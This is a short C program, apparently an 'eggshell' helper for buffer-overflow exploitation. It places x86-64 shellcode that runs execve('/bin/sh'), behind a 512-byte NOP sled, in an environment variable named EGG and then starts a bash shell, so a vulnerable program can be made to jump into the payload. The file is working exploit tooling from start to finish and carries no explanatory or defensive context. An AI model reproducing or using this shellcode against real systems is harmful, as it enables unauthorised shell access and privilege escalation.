#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define NOP (0x90)

static char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c"
"\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52"
"\x57\x54\x5e\xb0\x3b\x0f\x05";

int main(void)
{
  char shell[512];
  puts("Eggshell loaded into environment.");
  memset(shell,NOP,512);
  memcpy(&shell[512-strlen(shellcode)],shellcode,strlen(shellcode));
  setenv("EGG", shell, 1);
  putenv(shell);
  system("bash");
  return(0);
}
